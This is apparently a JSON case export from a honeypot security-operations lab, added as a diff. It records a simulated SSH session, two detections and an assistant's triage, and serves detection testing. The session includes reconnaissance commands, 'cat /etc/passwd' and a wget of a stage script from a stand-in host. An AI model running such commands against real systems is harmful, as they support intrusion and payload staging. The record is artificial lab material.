@@ -1,0 +1,467 @@
+{
+  "case": {
+    "case": {
+      "id": 1,
+      "ref": "CASE-00001",
+      "title": "Discovery command sequence from 127.208.20.10",
+      "status": "closed",
+      "severity": "high",
+      "verdict": "expected-test",
+      "sensor_id": "lab-sensor-01",
+      "source_ip": "127.208.20.10",
+      "first_activity": "2026-09-22T11:48:55.970143Z",
+      "last_activity": "2026-09-22T11:48:56.722722Z",
+      "created_at": "2026-09-22T11:48:56.476463Z",
+      "updated_at": "2026-09-22T11:50:11.703545Z",
+      "response_decision": "Rejected the restriction request; exported the URL and domain.",
+      "closure_reason": "Matches labtest scenario ssh-discovery-download in run 20260922T114855Z-666cb1. Both detections (HLAB-SSH-001, HLAB-SSH-002) fired on the expected events.",
+      "detection_count": 2,
+      "event_count": 4,
+      "session_ids": [
+        "01a0c8f2-92ef-75eb-925a-96ebd2817119"
+      ],
+      "services": [
+        "ssh"
+      ],
+      "closed_at": "2026-09-22T11:50:11.703545Z"
+    },
+    "detections": [
+      {
+        "id": 2,
+        "rule_id": "HLAB-SSH-002",
+        "rule_version": 1,
+        "rule_name": "Transfer command attempt",
+        "severity": "high",
+        "confidence": "high",
+        "sensor_id": "lab-sensor-01",
+        "source_ip": "127.208.20.10",
+        "session_id": "01a0c8f2-92ef-75eb-925a-96ebd2817119",
+        "service_type": "ssh",
+        "group_key": "01a0c8f2-92ef-75eb-925a-96ebd2817119|http://payload.example.test/stage.sh",
+        "first_seen": "2026-09-22T11:48:56.722722Z",
+        "last_seen": "2026-09-22T11:48:56.722722Z",
+        "detected_at": "2026-09-22T11:48:56.722722Z",
+        "explanation": "SSH session 01a0c8f2-92ef-75eb-925a-96ebd2817119 ran wget with the target http://payload.example.test/stage.sh. The honeypot shell simulates the command; this shows an attempted transfer, not a completed download.",
+        "matched_values": {
+          "command": "wget",
+          "command_line": "wget http://payload.example.test/stage.sh",
+          "target": "http://payload.example.test/stage.sh"
+        },
+        "mitre": [
+          "T1105"
+        ],
+        "suppressed_count": 0,
+        "case_id": 1,
+        "evidence": [
+          {
+            "event_id": "01a0c8f2-9712-7b00-b8b1-c31470388cd2",
+            "event_timestamp": "2026-09-22T11:48:56.722722Z",
+            "role": "trigger"
+          }
+        ]
+      },
+      {
+        "id": 1,
+        "rule_id": "HLAB-SSH-001",
+        "rule_version": 1,
+        "rule_name": "Discovery command sequence",
+        "severity": "low",
+        "confidence": "medium",
+        "sensor_id": "lab-sensor-01",
+        "source_ip": "127.208.20.10",
+        "session_id": "01a0c8f2-92ef-75eb-925a-96ebd2817119",
+        "service_type": "ssh",
+        "group_key": "01a0c8f2-92ef-75eb-925a-96ebd2817119",
+        "first_seen": "2026-09-22T11:48:55.970143Z",
+        "last_seen": "2026-09-22T11:48:56.47186Z",
+        "detected_at": "2026-09-22T11:48:56.47186Z",
+        "explanation": "SSH session 01a0c8f2-92ef-75eb-925a-96ebd2817119 ran 3 distinct discovery commands (whoami; uname; cat /etc/passwd) between 11:48:55Z and 11:48:56Z. Threshold is 3 within one session and 10m0s.",
+        "matched_values": {
+          "commands": [
+            "whoami",
+            "uname",
+            "cat /etc/passwd"
+          ],
+          "threshold": 3,
+          "window": "10m0s"
+        },
+        "mitre": [
+          "T1082",
+          "T1016"
+        ],
+        "suppressed_count": 0,
+        "case_id": 1,
+        "evidence": [
+          {
+            "event_id": "01a0c8f2-9422-722c-a1c7-4cfc846565fd",
+            "event_timestamp": "2026-09-22T11:48:55.970143Z",
+            "role": "contributing"
+          },
+          {
+            "event_id": "01a0c8f2-951c-7ef9-9b4e-32c5335c80e9",
+            "event_timestamp": "2026-09-22T11:48:56.220982Z",
+            "role": "contributing"
+          },
+          {
+            "event_id": "01a0c8f2-9617-7d1b-9daa-e08c40bb6e58",
+            "event_timestamp": "2026-09-22T11:48:56.47186Z",
+            "role": "trigger"
+          }
+        ]
+      }
+    ],
+    "notes": [
+      {
+        "id": 3,
+        "case_id": 1,
+        "at": "2026-09-22T11:50:11.692051Z",
+        "author": "assistant-demo",
+        "body": "One SSH session (01a0c8f2...) from 127.208.20.10 ran whoami, uname -a and cat /etc/passwd within 0.5 s, then cd /tmp; wget http://payload.example.test/stage.sh. The fake shell does not download anything, so this is an attempted transfer. payload.example.test is under the reserved .test domain and cannot resolve on the internet. Marked the URL and domain as suspicious and exported them as STIX (the internal source address was left out of the export, as expected)."
+      }
+    ],
+    "history": [
+      {
+        "id": 1,
+        "case_id": 1,
+        "at": "2026-09-22T11:48:56.476463Z",
+        "actor": "correlator",
+        "action": "case_created",
+        "detail": {
+          "detection_id": 1,
+          "reason": "no open case for this sensor and source within the correlation window",
+          "window": "30m0s"
+        }
+      },
+      {
+        "id": 2,
+        "case_id": 1,
+        "at": "2026-09-22T11:48:56.476463Z",
+        "actor": "correlator",
+        "action": "detection_linked",
+        "detail": {
+          "detection_id": 1,
+          "explanation": "SSH session 01a0c8f2-92ef-75eb-925a-96ebd2817119 ran 3 distinct discovery commands (whoami; uname; cat /etc/passwd) between 11:48:55Z and 11:48:56Z. Threshold is 3 within one session and 10m0s.",
+          "rule_id": "HLAB-SSH-001"
+        }
+      },
+      {
+        "id": 3,
+        "case_id": 1,
+        "at": "2026-09-22T11:48:56.726133Z",
+        "actor": "correlator",
+        "action": "detection_linked",
+        "detail": {
+          "detection_id": 2,
+          "explanation": "SSH session 01a0c8f2-92ef-75eb-925a-96ebd2817119 ran wget with the target http://payload.example.test/stage.sh. The honeypot shell simulates the command; this shows an attempted transfer, not a completed download.",
+          "rule_id": "HLAB-SSH-002"
+        }
+      },
+      {
+        "id": 4,
+        "case_id": 1,
+        "at": "2026-09-22T11:48:56.726133Z",
+        "actor": "correlator",
+        "action": "severity_changed",
+        "detail": {
+          "because": "HLAB-SSH-002",
+          "from": "low",
+          "to": "high"
+        }
+      },
+      {
+        "id": 5,
+        "case_id": 1,
+        "at": "2026-09-22T11:48:56.729209Z",
+        "actor": "playbook",
+        "action": "response_requested",
+        "detail": {
+          "action_id": 1,
+          "playbook": "restrict-lab-source"
+        }
+      },
+      {
+        "id": 34,
+        "case_id": 1,
+        "at": "2026-09-22T11:50:11.692051Z",
+        "actor": "assistant-demo",
+        "action": "note_added",
+        "detail": {
+          "note_id": 3
+        }
+      },
+      {
+        "id": 35,
+        "case_id": 1,
+        "at": "2026-09-22T11:50:11.697381Z",
+        "actor": "assistant-demo",
+        "action": "response_rejected",
+        "detail": {
+          "action_id": 1,
+          "from": "pending_approval"
+        }
+      },
+      {
+        "id": 36,
+        "case_id": 1,
+        "at": "2026-09-22T11:50:11.703545Z",
+        "actor": "assistant-demo",
+        "action": "verdict_changed",
+        "detail": {
+          "from": "",
+          "to": "expected-test"
+        }
+      },
+      {
+        "id": 37,
+        "case_id": 1,
+        "at": "2026-09-22T11:50:11.703545Z",
+        "actor": "assistant-demo",
+        "action": "response_decision_changed",
+        "detail": {
+          "from": "",
+          "to": "Rejected the restriction request; exported the URL and domain."
+        }
+      },
+      {
+        "id": 38,
+        "case_id": 1,
+        "at": "2026-09-22T11:50:11.703545Z",
+        "actor": "assistant-demo",
+        "action": "closure_reason_changed",
+        "detail": {
+          "from": "",
+          "to": "Matches labtest scenario ssh-discovery-download in run 20260922T114855Z-666cb1. Both detections (HLAB-SSH-001, HLAB-SSH-002) fired on the expected events."
+        }
+      },
+      {
+        "id": 39,
+        "case_id": 1,
+        "at": "2026-09-22T11:50:11.703545Z",
+        "actor": "assistant-demo",
+        "action": "status_changed",
+        "detail": {
+          "from": "new",
+          "to": "closed"
+        }
+      },
+      {
+        "id": 46,
+        "case_id": 1,
+        "at": "2026-09-22T11:50:11.727595Z",
+        "actor": "assistant-demo",
+        "action": "exported",
+        "detail": {
+          "events": 4,
+          "file": "CASE-00001-20260922T115011Z.md",
+          "format": "md",
+          "secrets_included": false
+        }
+      }
+    ],
+    "added_evidence": [],
+    "actions": [
+      {
+        "id": 1,
+        "case_id": 1,
+        "playbook": "restrict-lab-source",
+        "source_ip": "127.208.20.10",
+        "sensor_id": "lab-sensor-01",
+        "services": [
+          "ssh",
+          "http",
+          "ftp",
+          "smb",
+          "mysql",
+          "redis"
+        ],
+        "state": "rejected",
+        "summary": "When this was requested, CASE-00001 had 2 detection(s), severity high, for 127.208.20.10 on sensor lab-sensor-01 between 2026-09-22T11:48:55Z and 2026-09-22T11:48:56Z. Services involved: ssh. Approving adds 127.208.20.10 to the application denylist so new connections to the selected decoys are closed. It does not change the host firewall or end sessions that are already open.",
+        "requested_at": "2026-09-22T11:48:56.729209Z",
+        "decided_at": "2026-09-22T11:50:11.697381Z",
+        "decided_by": "assistant-demo",
+        "ended_at": "2026-09-22T11:50:11.697381Z"
+      }
+    ],
+    "observables": [
+      {
+        "id": 1,
+        "type": "ipv4",
+        "value": "127.208.20.10",
+        "original_value": "127.208.20.10",
+        "first_seen": "2026-09-22T11:48:55.665671Z",
+        "last_seen": "2026-09-22T11:48:57.224553Z",
+        "sight_count": 8,
+        "confidence": 0,
+        "source": "honeypot:ssh",
+        "tags": [
+          "role:source"
+        ],
+        "status": "observed",
+        "internal": true,
+        "claimed": false
+      },
+      {
+        "id": 9,
+        "type": "domain",
+        "value": "payload.example.test",
+        "original_value": "payload.example.test",
+        "first_seen": "2026-09-22T11:48:56.722722Z",
+        "last_seen": "2026-09-22T11:48:56.722722Z",
+        "sight_count": 1,
+        "confidence": 0,
+        "source": "honeypot:ssh",
+        "tags": [
+          "from:url"
+        ],
+        "status": "suspicious",
+        "internal": false,
+        "claimed": false
+      },
+      {
+        "id": 8,
+        "type": "url",
+        "value": "http://payload.example.test/stage.sh",
+        "original_value": "http://payload.example.test/stage.sh",
+        "first_seen": "2026-09-22T11:48:56.722722Z",
+        "last_seen": "2026-09-22T11:48:56.722722Z",
+        "sight_count": 1,
+        "confidence": 0,
+        "source": "honeypot:ssh",
+        "tags": [
+          "from:command"
+        ],
+        "status": "suspicious",
+        "internal": false,
+        "claimed": false
+      }
+    ],
+    "timeline": [
+      {
+        "id": "01a0c8f2-9422-722c-a1c7-4cfc846565fd",
+        "session_id": "01a0c8f2-92ef-75eb-925a-96ebd2817119",
+        "sensor_id": "lab-sensor-01",
+        "timestamp": "2026-09-22T11:48:55.970143Z",
+        "received_at": "2026-09-22T11:48:55.970168Z",
+        "service_type": "ssh",
+        "event_type": "command.input",
+        "source_ip": "127.208.20.10",
+        "source_port": 46115,
+        "dest_ip": "127.0.0.1",
+        "dest_port": 2222,
+        "protocol": "tcp",
+        "schema_version": 1,
+        "service_data": {
+          "command": "whoami",
+          "hostname": "web-prod-03"
+        },
+        "seq": 3,
+        "origin": "lab"
+      },
+      {
+        "id": "01a0c8f2-951c-7ef9-9b4e-32c5335c80e9",
+        "session_id": "01a0c8f2-92ef-75eb-925a-96ebd2817119",
+        "sensor_id": "lab-sensor-01",
+        "timestamp": "2026-09-22T11:48:56.220982Z",
+        "received_at": "2026-09-22T11:48:56.221026Z",
+        "service_type": "ssh",
+        "event_type": "command.input",
+        "source_ip": "127.208.20.10",
+        "source_port": 46115,
+        "dest_ip": "127.0.0.1",
+        "dest_port": 2222,
+        "protocol": "tcp",
+        "schema_version": 1,
+        "service_data": {
+          "command": "uname -a",
+          "hostname": "web-prod-03"
+        },
+        "seq": 4,
+        "origin": "lab"
+      },
+      {
+        "id": "01a0c8f2-9617-7d1b-9daa-e08c40bb6e58",
+        "session_id": "01a0c8f2-92ef-75eb-925a-96ebd2817119",
+        "sensor_id": "lab-sensor-01",
+        "timestamp": "2026-09-22T11:48:56.47186Z",
+        "received_at": "2026-09-22T11:48:56.471892Z",
+        "service_type": "ssh",
+        "event_type": "command.input",
+        "source_ip": "127.208.20.10",
+        "source_port": 46115,
+        "dest_ip": "127.0.0.1",
+        "dest_port": 2222,
+        "protocol": "tcp",
+        "schema_version": 1,
+        "service_data": {
+          "command": "cat /etc/passwd",
+          "hostname": "web-prod-03"
+        },
+        "seq": 5,
+        "origin": "lab"
+      },
+      {
+        "id": "01a0c8f2-9712-7b00-b8b1-c31470388cd2",
+        "session_id": "01a0c8f2-92ef-75eb-925a-96ebd2817119",
+        "sensor_id": "lab-sensor-01",
+        "timestamp": "2026-09-22T11:48:56.722722Z",
+        "received_at": "2026-09-22T11:48:56.722746Z",
+        "service_type": "ssh",
+        "event_type": "command.input",
+        "source_ip": "127.208.20.10",
+        "source_port": 46115,
+        "dest_ip": "127.0.0.1",
+        "dest_port": 2222,
+        "protocol": "tcp",
+        "schema_version": 1,
+        "service_data": {
+          "command": "cd /tmp; wget http://payload.example.test/stage.sh",
+          "hostname": "web-prod-03"
+        },
+        "seq": 6,
+        "origin": "lab"
+      }
+    ],
+    "timeline_total": 4,
+    "secrets_masked": true,
+    "action_history": {
+      "1": [
+        {
+          "id": 1,
+          "action_id": 1,
+          "at": "2026-09-22T11:48:56.729209Z",
+          "actor": "playbook",
+          "from_state": "",
+          "to_state": "pending_approval",
+          "detail": {
+            "case_id": 1,
+            "summary": "When this was requested, CASE-00001 had 2 detection(s), severity high, for 127.208.20.10 on sensor lab-sensor-01 between 2026-09-22T11:48:55Z and 2026-09-22T11:48:56Z. Services involved: ssh. Approving adds 127.208.20.10 to the application denylist so new connections to the selected decoys are closed. It does not change the host firewall or end sessions that are already open."
+          }
+        },
+        {
+          "id": 7,
+          "action_id": 1,
+          "at": "2026-09-22T11:50:11.697381Z",
+          "actor": "assistant-demo",
+          "from_state": "pending_approval",
+          "to_state": "rejected",
+          "detail": {
+            "reason": "Source is a labtest address and the session had already ended; a block would not change anything."
+          }
+        }
+      ]
+    }
+  },
+  "complete": true,
+  "counts": {
+    "actions": 1,
+    "detections": 2,
+    "events": 4,
+    "history": 12,
+    "notes": 1,
+    "observables": 3
+  },
+  "exported_at": "2026-09-22T11:50:11.736330738Z",
+  "exported_by": "assistant-demo",
+  "generator": "Honeypot SOC Investigation Lab",
+  "secrets_masked": true
+}
